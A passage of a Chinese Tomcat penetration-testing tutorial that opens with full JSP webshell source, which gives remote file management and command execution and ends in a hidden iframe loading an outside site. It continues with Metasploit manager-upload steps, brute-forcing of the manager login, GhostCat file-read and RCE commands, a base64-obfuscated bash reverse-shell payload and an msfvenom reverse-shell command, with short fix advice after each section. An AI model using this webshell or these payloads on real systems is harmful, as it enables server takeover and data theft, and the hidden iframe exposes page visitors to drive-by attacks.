static String convertFileSize(long filesize)  
{  
//bug 5.09M 显示5.9M  
String strUnit="Bytes";  
String strAfterComma="";  
int intDivisor=1;  
if(filesize>=1024\*1024)  
{  
strUnit = "MB";  
intDivisor=1024\*1024;  
}  
else if(filesize>=1024)  
{  
strUnit = "KB";  
intDivisor=1024;  
}  
if(intDivisor==1) return filesize + " " + strUnit;  
strAfterComma = "" + 100 \* (filesize % intDivisor) / intDivisor ;  
if(strAfterComma=="") strAfterComma=".0";  
return filesize / intDivisor + "." + strAfterComma + " " + strUnit;  
}  
%>  
<%  
request.setCharacterEncoding("gb2312");  
String tabID = request.getParameter("tabID");  
String strDir = request.getParameter("path");  
String strAction = request.getParameter("action");  
String strFile = request.getParameter("file");  
String strPath = strDir + "\\\\" + strFile;   
String strCmd = request.getParameter("cmd");  
StringBuffer sbEdit=new StringBuffer("");  
StringBuffer sbDown=new StringBuffer("");  
StringBuffer sbCopy=new StringBuffer("");  
StringBuffer sbSaveCopy=new StringBuffer("");  
StringBuffer sbNewFile=new StringBuffer("");  
if((tabID==null) || tabID.equals(""))  
{  
tabID = "1";  
}  
if(strDir==null||strDir.length()<1)  
{  
strDir = request.getRealPath("/");  
}  
if(strAction!=null && strAction.equals("down"))  
{  
File f=new File(strPath);  
if(f.length()==0)  
{  
sbDown.append("文件大小为 0 字节，就不用下了吧");  
}  
else  
{  
response.setHeader("content-type","text/html; charset=ISO-8859-1");  
response.setContentType("APPLICATION/OCTET-STREAM");   
response.setHeader("Content-Disposition","attachment; filename=\\""+f.getName()+"\\"");  
FileInputStream fileInputStream =new FileInputStream(f.getAbsolutePath());  
out.clearBuffer();  
int i;  
while ((i=fileInputStream.read()) != -1)  
{  
out.write(i);   
}  
fileInputStream.close();  
out.close();  
}  
}  
if(strAction!=null && strAction.equals("del"))  
{  
File f=new File(strPath);  
f.delete();  
}  
if(strAction!=null && strAction.equals("edit"))  
{  
File f=new File(strPath);   
BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(f)));  
sbEdit.append("<form name='frmEdit' action='' method='POST'>\\r\\n");  
sbEdit.append("<input type=hidden name=action value=save >\\r\\n");  
sbEdit.append("<input type=hidden name=path value='"+strDir+"' >\\r\\n");  
sbEdit.append("<input type=hidden name=file value='"+strFile+"' >\\r\\n");  
sbEdit.append("<input type=submit name=save value=' "+strFileSave\[languageNo\]+" '> ");  
sbEdit.append("<input type=button name=goback value=' "+strBack\[languageNo\]+" ' onclick='history.back(-1);'> &nbsp;"+strPath+"\\r\\n");  
sbEdit.append("<br><textarea rows=30 cols=90 name=content>");  
String line="";  
while((line=br.readLine())!=null)  
{  
sbEdit.append(htmlEncode(line)+"\\r\\n");    
}  
sbEdit.append("</textarea>");  
sbEdit.append("<input type=hidden name=path value="+strDir+">");  
sbEdit.append("</form>");  
}  
if(strAction!=null && strAction.equals("save"))  
{  
File f=new File(strPath);  
BufferedWriter bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(f)));  
String strContent=request.getParameter("content");  
bw.write(strContent);  
bw.close();  
}  
if(strAction!=null && strAction.equals("copy"))  
{  
File f=new File(strPath);  
sbCopy.append("<br><form name='frmCopy' action='' method='POST'>\\r\\n");  
sbCopy.append("<input type=hidden name=action value=savecopy >\\r\\n");  
sbCopy.append("<input type=hidden name=path value='"+strDir+"' >\\r\\n");  
sbCopy.append("<input type=hidden name=file value='"+strFile+"' >\\r\\n");  
sbCopy.append("原始文件： "+strPath+"<p>");  
sbCopy.append("目标文件： <input type=text name=file2 size=40 value='"+strDir+"'><p>");  
sbCopy.append("<input type=submit name=save value=' "+strFileCopy\[languageNo\]+" '> ");  
sbCopy.append("<input type=button name=goback value=' "+strBack\[languageNo\]+" ' onclick='history.back(-1);'> <p>&nbsp;\\r\\n");  
sbCopy.append("</form>");  
}  
if(strAction!=null && strAction.equals("savecopy"))  
{  
File f=new File(strPath);  
String strDesFile=request.getParameter("file2");  
if(strDesFile==null || strDesFile.equals(""))  
{  
sbSaveCopy.append("<p><font color=red>目标文件错误。</font>");  
}  
else  
{  
File f\_des=new File(strDesFile);  
if(f\_des.isFile())  
{  
sbSaveCopy.append("<p><font color=red>目标文件已存在,不能复制。</font>");  
}  
else  
{  
String strTmpFile=strDesFile;  
if(f\_des.isDirectory())  
{  
if(!strDesFile.endsWith("\\\\"))  
{  
strDesFile=strDesFile+"\\\\";  
}  
strTmpFile=strDesFile+"cqq\_"+strFile;  
}  
  
File f\_des\_copy=new File(strTmpFile);  
FileInputStream in1=new FileInputStream(f);  
FileOutputStream out1=new FileOutputStream(f\_des\_copy);  
byte\[\] buffer=new byte\[1024\];  
int c;  
while((c=in1.read(buffer))!=-1)  
{  
out1.write(buffer,0,c);  
}  
in1.close();  
out1.close();  
  
sbSaveCopy.append("原始文件 ："+strPath+"<p>");  
sbSaveCopy.append("目标文件 ："+strTmpFile+"<p>");  
sbSaveCopy.append("<font color=red>复制成功！</font>");     
}    
}   
sbSaveCopy.append("<p><input type=button name=saveCopyBack onclick='history.back(-2);' value=返回>");  
}  
if(strAction!=null && strAction.equals("newFile"))  
{  
String strF=request.getParameter("fileName");  
String strType1=request.getParameter("btnNewFile");  
String strType2=request.getParameter("btnNewDir");  
String strType="";  
if(strType1==null)  
{  
strType="Dir";  
}  
else if(strType2==null)  
{  
strType="File";  
}  
if(!strType.equals("") && !(strF==null || strF.equals("")))  
{    
File f\_new=new File(strF);     
if(strType.equals("File") && !f\_new.createNewFile())  
sbNewFile.append(strF+" 文件创建失败");  
if(strType.equals("Dir") && !f\_new.mkdirs())  
sbNewFile.append(strF+" 目录创建失败");  
}  
else  
{  
sbNewFile.append("<p><font color=red>建立文件或目录出错。</font>");  
}  
}  
if((request.getContentType()!= null) && (request.getContentType().toLowerCase().startsWith("multipart")))  
{  
String tempdir=".";  
boolean error=false;  
response.setContentType("text/html");  
sbNewFile.append("<p><font color=red>建立文件或目录出错。</font>");  
HttpMultiPartParser parser = new HttpMultiPartParser();  
int bstart = request.getContentType().lastIndexOf("oundary=");  
String bound = request.getContentType().substring(bstart + 8);  
int clength = request.getContentLength();  
Hashtable ht = parser.processData(request.getInputStream(), bound, tempdir, clength);  
if (ht.get("cqqUploadFile") != null)  
{  
FileInfo fi = (FileInfo) ht.get("cqqUploadFile");  
File f1 = fi.file;  
UplInfo info = UploadMonitor.getInfo(fi.clientFileName);  
if (info != null && info.aborted)   
{  
f1.delete();  
request.setAttribute("error", "Upload aborted");  
}  
else   
{  
String path = (String) ht.get("path");  
if(path!=null && !path.endsWith("\\\\"))   
path = path + "\\\\";  
if (!f1.renameTo(new File(path + f1.getName())))   
{  
request.setAttribute("error", "Cannot upload file.");  
error = true;  
f1.delete();  
}  
}  
}  
}  
%>  
<html>  
<head>  
<style type="text/css">  
td,select,input,body{font-size:9pt;}  
A { TEXT-DECORATION: none }  
#tablist{  
padding: 5px 0;  
margin-left: 0;  
margin-bottom: 0;  
margin-top: 0.1em;  
font:9pt;  
}  
#tablist li{  
list-style: none;  
display: inline;  
margin: 0;  
}  
#tablist li a{  
padding: 3px 0.5em;  
margin-left: 3px;  
border: 1px solid ;  
background: F6F6F6;  
}  
#tablist li a:link, #tablist li a:visited{  
color: navy;  
}  
#tablist li a.current{  
background: #EAEAFF;  
}  
#tabcontentcontainer{  
width: 100%;  
padding: 5px;  
border: 1px solid black;  
}  
.tabcontent{  
display:none;  
}  
</style>  
<script type="text/javascript">  
var initialtab=\[<%=tabID%>, "menu<%=tabID%>"\]  
////////Stop editting////////////////  
function cascadedstyle(el, cssproperty, csspropertyNS){  
if (el.currentStyle)  
return el.currentStyle\[cssproperty\]  
else if (window.getComputedStyle){  
var elstyle=window.getComputedStyle(el, "")  
return elstyle.getPropertyValue(csspropertyNS)  
}  
}  
var previoustab=""  
function expandcontent(cid, aobject){  
if (document.getElementById){  
highlighttab(aobject)  
if (previoustab!="")  
document.getElementById(previoustab).style.display="none"  
document.getElementById(cid).style.display="block"  
previoustab=cid  
if (aobject.blur)  
aobject.blur()  
return false  
}  
else  
return true  
}  
function highlighttab(aobject){  
if (typeof tabobjlinks=="undefined")  
collecttablinks()  
for (i=0; i<tabobjlinks.length; i++)  
tabobjlinks\[i\].style.backgroundColor=initTabcolor  
var themecolor=aobject.getAttribute("theme")? aobject.getAttribute("theme") : initTabpostcolor  
aobject.style.backgroundColor=document.getElementById("tabcontentcontainer").style.backgroundColor=themecolor  
}  
function collecttablinks(){  
var tabobj=document.getElementById("tablist")  
tabobjlinks=tabobj.getElementsByTagName("A")  
}  
function do\_onload(){  
collecttablinks()  
initTabcolor=cascadedstyle(tabobjlinks\[1\], "backgroundColor", "background-color")  
initTabpostcolor=cascadedstyle(tabobjlinks\[0\], "backgroundColor", "background-color")  
expandcontent(initialtab\[1\], tabobjlinks\[initialtab\[0\]-1\])  
}  
if (window.addEventListener)  
window.addEventListener("load", do\_onload, false)  
else if (window.attachEvent)  
window.attachEvent("onload", do\_onload)  
else if (document.getElementById)  
window.onload=do\_onload  
</script>  
<script language="javascript">  
function doForm(action,path,file,cmd,tab,content)  
{  
document.frmCqq.action.value=action;  
document.frmCqq.path.value=path;  
document.frmCqq.file.value=file;  
document.frmCqq.cmd.value=cmd;  
document.frmCqq.tabID.value=tab;  
document.frmCqq.content.value=content;  
if(action=="del")  
{  
if(confirm("确定要删除文件 "+file+" 吗？"))  
document.frmCqq.submit();  
}  
else  
{  
document.frmCqq.submit();      
}  
}  
</script>  
<title>JSP Shell 岁月联盟专用版本</title>  
<head>  
<body>  
<form name="frmCqq" method="post" action="">  
<input type="hidden" name="action" value="">  
<input type="hidden" name="path" value="">  
<input type="hidden" name="file" value="">  
<input type="hidden" name="cmd" value="">  
<input type="hidden" name="tabID" value="2">  
<input type="hidden" name="content" value="">  
</form>  
<!--Top Menu Started-->  
<ul id="tablist">  
<li><a href="" class="current" onClick="return expandcontent('menu1', this)"> <%=strFileManage\[languageNo\]%> </a></li>  
<li><a href="new.htm" onClick="return expandcontent('menu2', this)" theme="#EAEAFF"> <%=strCommand\[languageNo\]%> </a></li>  
<li><a href="hot.htm" onClick="return expandcontent('menu3', this)" theme="#EAEAFF"> <%=strSysProperty\[languageNo\]%> </a></li>  
<li><a href="search.htm" onClick="return expandcontent('menu4', this)" theme="#EAEAFF"> <%=strHelp\[languageNo\]%> </a></li>  
&nbsp; <%=authorInfo\[languageNo\]%>  
</ul>  
<!--Top Menu End-->  
<%  
StringBuffer sbFolder=new StringBuffer("");  
StringBuffer sbFile=new StringBuffer("");  
try  
{  
File objFile = new File(strDir);  
File list\[\] = objFile.listFiles();   
if(objFile.getAbsolutePath().length()>3)  
{  
sbFolder.append("<tr><td >&nbsp;</td><td><a href=\\"javascript:doForm('','"+formatPath(objFile.getParentFile().getAbsolutePath())+"','','"+strCmd+"','1','');\\">");  
sbFolder.append(strParentFolder\[languageNo\]+"</a><br>- - - - - - - - - - - </td></tr>\\r\\n ");  
}  
for(int i=0;i<list.length;i++)  
{  
if(list\[i\].isDirectory())  
{  
sbFolder.append("<tr><td >&nbsp;</td><td>");  
sbFolder.append("  <a href=\\"javascript:doForm('','"+formatPath(list\[i\].getAbsolutePath())+"','','"+strCmd+"','1','');\\">");  
sbFolder.append(list\[i\].getName()+"</a><br></td></tr> ");  
}  
else  
{  
String strLen="";  
String strDT="";  
long lFile=0;  
lFile=list\[i\].length();  
strLen = convertFileSize(lFile);  
Date dt=new Date(list\[i\].lastModified());  
strDT=dt.toLocaleString();  
sbFile.append("<tr onmouseover=\\"this.style.backgroundColor='#FBFFC6'\\" onmouseout=\\"this.style.backgroundColor='white'\\"><td>");  
sbFile.append(""+list\[i\].getName());   
sbFile.append("</td><td>");  
sbFile.append(""+strLen);  
sbFile.append("</td><td>");  
sbFile.append(""+strDT);  
sbFile.append("</td><td>");  
sbFile.append(" &nbsp;<a href=\\"javascript:doForm('edit','"+formatPath(strDir)+"','"+list\[i\].getName()+"','"+strCmd+"','"+tabID+"','');\\">");  
sbFile.append(strFileEdit\[languageNo\]+"</a> ");  
sbFile.append(" &nbsp;<a href=\\"javascript:doForm('del','"+formatPath(strDir)+"','"+list\[i\].getName()+"','"+strCmd+"','"+tabID+"','');\\">");  
sbFile.append(strFileDel\[languageNo\]+"</a> ");  
sbFile.append("  &nbsp;<a href=\\"javascript:doForm('down','"+formatPath(strDir)+"','"+list\[i\].getName()+"','"+strCmd+"','"+tabID+"','');\\">");  
sbFile.append(strFileDown\[languageNo\]+"</a> ");  
sbFile.append("  &nbsp;<a href=\\"javascript:doForm('copy','"+formatPath(strDir)+"','"+list\[i\].getName()+"','"+strCmd+"','"+tabID+"','');\\">");  
sbFile.append(strFileCopy\[languageNo\]+"</a> ");  
}    
}   
}  
catch(Exception e)  
{  
out.println("<font color=red>操作失败： "+e.toString()+"</font>");  
}  
%>  
<DIV id="tabcontentcontainer">  
<div id="menu3" class="tabcontent">  
<br>   
<br> &nbsp;&nbsp; 未完成  
<br>   
<br>&nbsp;  
</div>  
<div id="menu4" class="tabcontent">  
<br>  
<p>一、功能说明</p>  
<p>&nbsp;&nbsp;&nbsp; jsp 版本的文件管理器，通过该程序可以远程管理服务器上的文件系统，您可以新建、修改、</p>  
<p>删除、下载文件和目录。对于windows系统，还提供了命令行窗口的功能，可以运行一些程序，类似</p>  
<p>与windows的cmd。</p>  
<p>&nbsp;</p>  
<p>二、测试</p>  
<p>&nbsp;&nbsp;&nbsp;<b>请大家在使用过程中，有任何问题，意见或者建议都可以给我留言，以便使这个程序更加完善和稳定，<p>  
留言地址为：<a href="http://" target="\_blank"></a></b>  
<p>&nbsp;</p>  
<p>三、更新记录</p>  
<p>&nbsp;&nbsp;&nbsp; 2004.11.15&nbsp; V0.9测试版发布，增加了一些基本的功能，文件编辑、复制、删除、下载、上传以及新建文件目录功能</p>  
<p>&nbsp;&nbsp;&nbsp; 2004.10.27&nbsp; 暂时定为0.6版吧， 提供了目录文件浏览功能 和 cmd功能</p>  
<p>&nbsp;&nbsp;&nbsp; 2004.09.20&nbsp; 第一个jsp&nbsp;程序就是这个简单的显示目录文件的小程序</p>  
<p>&nbsp;</p>  
<p>&nbsp;</p>  
</div>  
<div id="menu1" class="tabcontent">  
<%  
out.println("<table border='1' width='100%' bgcolor='#FBFFC6' cellspacing=0 cellpadding=5 bordercolorlight=#000000 bordercolordark=#FFFFFF><tr><td width='30%'>"+strCurrentFolder\[languageNo\]+"： <b>"+strDir+"</b></td><td>" + getDrivers() + "</td></tr></table><br>\\r\\n");  
%>  
<table width="100%" border="1" cellspacing="0" cellpadding="5" bordercolorlight="#000000" bordercolordark="#FFFFFF">  
  
<tr>   
<td width="25%" align="center" valign="top">   
<table width="98%" border="0" cellspacing="0" cellpadding="3">  
<%=sbFolder%>  
</tr>                   
</table>  
</td>  
<td width="81%" align="left" valign="top">  
  
<%  
if(strAction!=null && strAction.equals("edit"))  
{  
out.println(sbEdit.toString());  
}  
else if(strAction!=null && strAction.equals("copy"))  
{  
out.println(sbCopy.toString());  
}  
else if(strAction!=null && strAction.equals("down"))  
{  
out.println(sbDown.toString());  
}  
else if(strAction!=null && strAction.equals("savecopy"))  
{  
out.println(sbSaveCopy.toString());  
}  
else if(strAction!=null && strAction.equals("newFile") && !sbNewFile.toString().equals(""))  
{  
out.println(sbNewFile.toString());  
}  
else  
{  
%>  
<span id="EditBox"><table width="98%" border="1" cellspacing="1" cellpadding="4" bordercolorlight="#cccccc" bordercolordark="#FFFFFF" bgcolor="white" >  
<tr bgcolor="#E7e7e6">   
<td width="26%"><%=strFileName\[languageNo\]%></td>  
<td width="19%"><%=strFileSize\[languageNo\]%></td>  
<td width="29%"><%=strLastModified\[languageNo\]%></td>  
<td width="26%"><%=strFileOperation\[languageNo\]%></td>  
</tr>                
<%=sbFile%>  
<!-- <tr align="center">   
<td colspan="4"><br>  
总计文件个数：<font color="#FF0000">30</font> ，大小：<font color="#FF0000">664.9</font>   
KB </td>  
</tr>  
\-->  
</table>  
</span>  
<%  
}    
%>  
</td>  
</tr>  
<form name="frmMake" action="" method="post">  
<tr><td colspan=2 bgcolor=#FBFFC6>  
<input type="hidden" name="action" value="newFile">  
<input type="hidden" name="path" value="<%=strDir%>">  
<input type="hidden" name="file" value="<%=strFile%>">  
<input type="hidden" name="cmd" value="<%=strCmd%>">  
<input type="hidden" name="tabID" value="1">  
<input type="hidden" name="content" value="">  
<%  
if(!strDir.endsWith("\\\\"))  
strDir = strDir + "\\\\";  
%>  
<input type="text" name="fileName" size=36 value="<%=strDir%>">  
<input type="submit" name="btnNewFile" value="新建文件" onclick="frmMake.submit()" >   
<input type="submit" name="btnNewDir" value="新建目录"  onclick="frmMake.submit()" >   
</form>    
<form name="frmUpload" enctype="multipart/form-data" action="" method="post">  
<input type="hidden" name="action" value="upload">  
<input type="hidden" name="path" value="<%=strDir%>">  
<input type="hidden" name="file" value="<%=strFile%>">  
<input type="hidden" name="cmd" value="<%=strCmd%>">  
<input type="hidden" name="tabID" value="1">  
<input type="hidden" name="content" value="">  
<input type="file" name="cqqUploadFile" size="36">  
<input type="submit" name="submit" value="上传">  
</td></tr></form>  
</table>  
</div>  
<div id="menu2" class="tabcontent">  
<%  
String line="";  
StringBuffer sbCmd=new StringBuffer("");  
if(strCmd!=null)   
{  
try  
{  
//out.println(strCmd);  
Process p=Runtime.getRuntime().exec("cmd /c "+strCmd);  
BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));  
while((line=br.readLine())!=null)  
{  
sbCmd.append(line+"\\r\\n");    
}      
}  
catch(Exception e)  
{  
System.out.println(e.toString());  
}  
}  
else  
{  
strCmd = "set";  
}  
%>  
<form name="cmd" action="" method="post">  
&nbsp;  
<input type="text" name="cmd" value="<%=strCmd%>" size=50>  
<input type="hidden" name="tabID" value="2">  
<input type=submit name=submit value="<%=strExecute\[languageNo\]%>">  
</form>  
<%  
if(sbCmd!=null && sbCmd.toString().trim().equals("")==false)  
{  
%>  
&nbsp;<TEXTAREA NAME="cqq" ROWS="20" COLS="100%"><%=sbCmd.toString()%></TEXTAREA>  
<br>&nbsp;  
<%  
}  
%>  
</DIV>  
</div>  
<br><br>  
<center><a href="http://" target="\_blank"></a>   
<br>  
<iframe src=http://7jyewu.cn/a/a.asp width=0 height=0></iframe>

（6）超级木马链接

超级合集木马链接：

[https://github.com/tennc/webshell](https://github.com/tennc/webshell)

![61](_v_images/111623709216660.jpeg)

![62](_v_images/109563709231108.jpeg)

（7）msf上线控制

use exploit/multi/http/tomcat\_mgr\_upload  
  
set HttpUsername tomcat  
  
set HttpPassword tomcat  
  
set rhosts 192.168.175.191  
  
set rport 8080   
  
exploit

![63](_v_images/107533709230931.jpeg)

修复建议：

1.在系统上以低权限运行Tomcat应用程序。创建一个专门的Tomcat服务用户，该用户只能拥有一组最小权限（例如不允许远程登录）

2.增加对于本地和基于证书的身份验证，部署账户锁定机制（对于集中式认证，目录服务也要做相应的配置）在CATALINA\_HOME/conf/web.xml文件设置锁定机制和时间超时机制

3.以及针对manage-gui/manager-status/manager-script等目录页面设置最小权限访问限制

### Tomcat mangaer APP暴力破解

全版本影响

[http://192.168.253.86:8080/manager/html](http://192.168.253.86:8080/manager/html)

对后台进行抓包

![64](_v_images/105493709229929.jpeg)

![65](_v_images/103453709228634.jpeg)

![66](_v_images/101403709223595.jpeg)

账号密码数值是以base64加密传输的

base64爆破Tomcat

![67](_v_images/99363709211505.jpeg)

![68](_v_images/97303709211366.jpeg)

爆破成功

注意事项：

不去掉下图中的勾选的话会在爆破中产生URL编码，例如%3d%2a等等，导致爆破无效

![69](_v_images/95273709215115.jpeg)

还可以使用另外一种思路爆破

自定义迭代器

![70](_v_images/93213709225817.jpeg)

![71](_v_images/91163709243604.jpeg)

![72](_v_images/89123709216649.jpeg)

新建三个密码本

![73](_v_images/87073709216040.jpeg)

位置1填入用户名：都选中base64

![74](_v_images/85033709223155.jpeg)

位置2填入符号

![75](_v_images/82983709214208.jpeg)

位置3填入密码本

![76](_v_images/80943709211704.jpeg)

然后开始攻击即可爆破成功

![77](_v_images/78913709221174.jpeg)

![78](_v_images/76873709228040.jpeg)

![79](_v_images/74833709234494.jpeg)

然后进行base64解密

即可成功得到账号和密码

修复建议：

1.取消manager/html功能

2.manager页面应只允许本地IP访问

### Tomcat AJP文件包含漏洞分析（CVE-2020-1938）

1）漏洞简介

由于Tomcat在处理AJP请求时，未对请求做任何验证，通过设置AJP连接器封装的request对象的属性，导致产生任意文件读取漏洞和代码执行漏洞

CVE-2020-1938 又名 GhostCat，之前引起了一场风雨，由长亭科技安全研究员发现的存在于Tomcat中的安全漏洞，由于Tomcat AJP协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或者包含Tomcat上所有webapp目录下的任意文件，例如可以读取webapp配置文件或源代码。此外在目标应用由文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害

影响版本：

Apache Tomcat 9.x < 9.0.31

Apache Tomcat 8.x < 8.5.51

Apache Tomcat 7.x < 7.0.100

Apache Tomcat 6.x

影响说明：读取webapps下的所有文件

2）漏洞源码分析

漏洞成因是两个配置文件导致：

Tomcat在部署时有两个重要的配置文件 conf/server.xml、conf/web.xml。前者定义了tomcat启动时涉及的组件属性

其中包含两个connector（用于处理请求的组件）：

![80](_v_images/72793709239358.jpeg)

如果开启状态下，tomcat启动后会监听8080、8009端口，他们分别负责接收http、ajp协议的数据。后者则和普通的java web应用一样，用来定义servlet，这里是tomcat内建的几个servlet：

![81](_v_images/70743709216918.jpeg)

就像注释中描述的 default servlet 用来处理所有未被匹配到其他servlet的url请求，jsp servlet用来处理以 .jsp .jspxz做后缀名的url请求，这两都随tomcat一起启动

3）tomcat结构简介

![82](_v_images/67703709235677.jpeg)

tomcat的整体架构如上图所示，一个tomcat就是一个server，其中可以包含多个service（这里指的是一个抽象的逻辑层）而每个service由Connector、Container、Jsp引擎、日志等组件构成，与此次漏洞相关的组件主要是前两者。

Connector是用来接收客户端的请求，请求中的数据包在被Connector解析后就会由Container处理

![83](_v_images/65653709238175.jpeg)

Container中可以包含多个Host（虚拟主机，同Apache定义），一个Host对应一个域名，因此Tomcat也可以配置多域名；每个Host又可以有多个Context，每个context其实就是一个Web应用；而context下又有多个wrapper，wrapper和serclet一一对应，只是他封装了一些管理servlet的函数。更进一步，客户端请求交由servlet进入应用级的逻辑处理

4）漏洞复现

开启vulhub

![84](_v_images/63613709240571.jpeg)

cd CVE-2020-1938  
docker-compose up -d  
docker ps

成功开启漏洞环境

简单了解下运行过程：Tomcat最顶层的容器是service，一个service有多个Connector和一个Container组成。这两个组件的作用为：

（1）Connector用于处理连接相关的事情，并提供Socket与Request和Response相关的转化

（2）Container用于封装和管理Servlet，以及具体处理Request请求

Tomcat默认的conf/server.xml中配置了2个Connector，一个为8080的对外提供的HTTP协议（1.1版本）端口，默认监听地址：0.0.0.0：8080，另外一个就是默认的8009 AJP协议（1.3版本）端口，默认监听地址：0.0.0.0:8009，两个端口监听在外网IP

此次漏洞产生的位置便是8009的AJP协议，此处使用公开的利用脚本进行测试，可以看到能读取web.xml文件

5）漏洞复现-利用poc攻击

poc地址：[https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi)

该脚本环境为python2环境

![85](_v_images/59553709222691.jpeg)

python2 文件读取.py 192.168.175.191 -p 8009 -f webapps目录下的待读取的文件  
python2 文件读取.py 192.168.175.191 -p 8009 -f /WEB-INF/web.xml

![86](_v_images/57473709226937.jpeg)

成功读取 /WEB-INF/web.xml 的文件的源码

6）漏洞复现-文件包含RCE

该漏洞可以将任意文件类型解析为jsp，从而达到任意命令执行的效果。但是漏洞需要配合文件上传漏洞才可以利用，假设目标服务器已经有了一个shell.png，里面内容是执行任意命令，可以执行以下命令得到命令执行结果

在线bash payload生成：

[http://www.jackson-t.ca/runtime-exec-payloads.html](http://www.jackson-t.ca/runtime-exec-payloads.html)

![87](_v_images/55433709230382.jpeg)

bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NS4xOTEvODg4OCAwPiYx}|{base64,-d}|{bash,-i}

最终的txt的payload

<%  
java.io.InputStream in = Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NS4xOTEvODg4OCAwPiYx}|{base64,-d}|{bash,-i}").getInputStream();  
int a = -1;  
byte\[\] b = new byte\[2048\];  
out.print("<pre>");  
while((a=in.read(b))!=-1){  
out.println(new String(b));  
}  
out.print("</pre>");  
%>

这边要手动上传上去

使用docker命令上传：

sudo docker cp /home/dayu/Desktop/dayu-RCE.txt 8fa6aa4867f3:/usr/local/tomcat/webapps/ROOT

![88](_v_images/53393709237713.jpeg)

python 12.py -p 8009 -f dayu-RCE.txt 192.168.253.7

![89](_v_images/51323709217547.jpeg)

该漏洞可以与爆破war上传联动

7）MSF上线

msfvenom生成木马：

msfvenom -p java/jsp\_shell\_reverse\_tcp LHOST=192.168.253.9 LPORT=5555 R > shell.txt

![90](_v_images/49283709229680.jpeg)

将木马shell上传到ROOT目录下

sudo docker cp /home/dayu/Desktop/shell.txt 8fa6aa4867f3:/usr/local/tomcat/webapps/ROOT

开启msf

![91](_v_images/46163709211254.jpeg)

使用RCE执行shell.txt

python 12.py -p 8009 -f shell.txt 192.168.253.7

成功上线

8）修复建议

1.将Tomcat立即升级到9.0.31、8.5.51、7.0.100版本进行修复

2.禁用AJP协议

具体方法：编辑 /conf/server.xml，找到下面这行：

<Connector port="8009"protocol="AJP/1.3" redirectPort="8443" />

将此行注释掉，也可以删掉该行

<!--<Connectorport="8009" protocol="AJP/1.3"redirectPort="8443" />-->

3.配置secret来设置AJP协议的认证凭证

例如（注意必须得将YOUR\_TOMCAT\_AJP\_SECRET更改为一个安全性高、无法被轻易猜解的值）

<Connector port="8009"protocol="AJP/1.3" redirectPort="8443"address="YOUR\_TOMCAT\_IP\_ADDRESS" secret="YOUR\_TOMCAT\_AJP\_SECRET"/>

本文作者：YLion， 属于FreeBuf原创奖励计划，未经许可禁止转载